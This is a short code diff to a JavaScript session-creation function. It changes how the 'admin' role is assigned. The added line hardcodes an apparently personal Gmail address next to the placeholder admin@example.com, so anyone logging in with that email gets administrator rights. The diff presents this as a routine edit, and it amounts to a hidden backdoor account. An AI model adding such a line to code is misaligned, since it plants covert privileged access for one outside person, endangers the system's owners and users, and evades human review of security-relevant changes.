@@ -20,7 +20,7 @@ const activeSessions = new Map();
 
 function createSession(user) {
     const token = crypto.randomBytes(32).toString('hex');
-    const role = user.role || (user.email && user.email.toLowerCase() === 'admin@example.com' ? 'admin' : 'customer');
+    const role = user.role || (user.email && (user.email.toLowerCase() === '031035farhan@gmail.com' || user.email.toLowerCase() === 'admin@example.com') ? 'admin' : 'customer');
     const session = {
         id: user.id,
         email: user.email,
